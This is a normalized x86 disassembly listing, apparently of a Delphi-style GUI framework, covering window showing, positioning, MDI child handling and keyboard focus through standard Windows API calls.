cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_404480
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_45deb0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_45e00c
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_45de04
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_43ec78
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e013
lea eax [ ebp - 0x10 ]
call sub_40442c
retn
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_414b3c
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_44187c
lea eax [ ebp - 0x1c ]
call sub_4074a8
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_45de04
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_45de44
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4623a8
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_462410
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_462410
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_45de7c
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_414b3c
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_44187c
lea eax [ ebp - 0x1c ]
call sub_4074a8
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_462340
test [ esi + 0x228 ] 0x8
je r-xdata
sub_45e01c
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_45e090
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x18 ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22a ] al
xor eax eax
push ebp
push sub_45e113
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_446a84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e11a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22a ] 0x0
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x48 ]
jne r-xdata
mov al 0x1
mov eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4c ]
jne r-xdata
sub_45e126
add [ eax ] al
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2ec ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_4038bc
pop esi
pop ebx
retn
sub_45e14c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2ec ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_4038bc
pop esi
pop ebx
retn
sub_45e170
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_44794c
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_4489b8
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_4489b8
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_45e20c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45e776
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_4627fc
mov eax [ ebp - 0x4 ]
or [ eax + 0x2ec ] 0x4
xor edx edx
push ebp
push sub_45e759
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2ec ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e760
mov eax [ ebp - 0x4 ]
and [ eax + 0x2ec ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
xor eax eax
push ebp
push sub_45e660
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_45e2c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_4038bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45d3f8
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2ec ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_445a78
jmp r-xdata
mov eax [ rw-data ]
call sub_45fa3c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_441768
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_448484
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_45fa30
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4417ac
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_448484
call sub_459038
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45fa6c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_441768
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45fa3c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_441fc4
push 0x0
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45fa60
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4417ac
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45fa30
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_45c6ac
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_45c6ac
jmp r-xdata
sub_45e2c9
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_461f40
call sub_403f08
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ rw-data ]
call sub_45fa3c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_441768
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_45fa30
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4417ac
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_45fa6c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_441768
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_45fa3c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e760
mov eax [ ebp - 0x4 ]
and [ eax + 0x2ec ] 0xfb
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_441fc4
push 0x0
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_45fa60
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_4417ac
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_45fa30
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_45c6ac
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_45c6ac
jmp r-xdata
sub_45e665
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_461f40
call sub_403f08
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45d3f8
mov eax [ ebp - 0x4 ]
test [ eax + 0x2ec ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_445a78
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_448484
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call SetWindowPos
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e760
mov eax [ ebp - 0x4 ]
and [ eax + 0x2ec ] 0xfb
retn
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_448484
call sub_459038
mov ebx eax
sub_45e7ac
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
retn
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
sub_45e804
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
cmp [ esi + 0x59 ] 0x0
je r-xdata
pop esi
pop ecx
pop ebp
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421340
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45e862
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x68 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4036c0
retn
mov eax [ esi + 0x68 ]
mov edx [ edx + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
sub_45e870
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
mov si 0xffab
call sub_4038bc
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45e89c
push ebx
push esi
push ecx
mov ebx eax
test [ ebx + 0x2ec ] 0x8
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe0 ]
test al al
je r-xdata
mov [ ebx + 0x24c ] 0x2
jmp r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov [ esp ] 0x1
test [ ebx + 0x228 ] 0x2
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov [ esp ] 0x3
jmp r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax [ rw-data ]
call sub_461f2c
jmp r-xdata
mov edx esp
mov eax ebx
mov si 0xffb0
call sub_4038bc
cmp [ esp ] 0x0
je r-xdata
cmp [ esp ] 0x3
jne r-xdata
mov eax ebx
call sub_45ea3c
jmp r-xdata
mov eax ebx
call sub_45ead8
mov dl 0x1
mov eax ebx
call sub_45c66c
jmp r-xdata
sub_45e940
push ebx
push esi
push edi
push ecx
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x29a ] 0x0
je r-xdata
mov [ esp ] 0x0
mov eax ebx
call sub_45bff8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx ebx
mov eax [ ebx + 0x29c ]
call [ ebx + 0x298 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_45c044
mov edx [ eax ]
call [ edx + 0xe0 ]
test al al
je r-xdata
sub_45e9a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45ea10
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
test al al
je r-xdata
mov al [ ebp - 0x5 ]
sub al 0x1
jb r-xdata
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_4038bc
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x24c ] edx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_45ead8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45ea5c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_45eaca
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22e ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ead1
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_45d2f4
sub_45eaf4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
mov ebx rw-data
xor eax eax
push ebp
push sub_45ed84
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4405c4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call ReleaseCapture
mov eax [ ebp - 0x4 ]
or [ eax + 0x2ec ] 0x8
call GetActiveWindow
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
mov ecx [ eax + 0x78 ]
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
